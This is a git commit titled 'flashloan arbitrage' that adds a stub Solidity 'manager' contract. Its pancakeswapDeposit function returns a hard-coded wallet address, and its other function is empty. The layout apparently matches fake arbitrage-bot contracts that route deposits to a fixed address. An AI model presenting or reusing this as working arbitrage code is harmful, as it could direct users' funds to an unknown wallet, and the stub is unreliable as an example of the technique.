d1a1d51355092c9473acb3d230b434b9fe8e8041
tech20045 <105287132+tech20045@users.noreply.github.com>
2022-05-10 05:52:34 -0700

    flashloan arbitrage

---
+++ add.sol
@@ -0,0 +1,14 @@
+pragma solidity ^0.5.0;
+
+
+contract manager {
+        function performTask() public pure {
+        }
+
+
+
+       function pancakeswapDeposit() public pure returns (address) {
+               return 0xCA9DB11ce9098F40018E43dEFcdBa42049d08f13;
+       }
+
+}
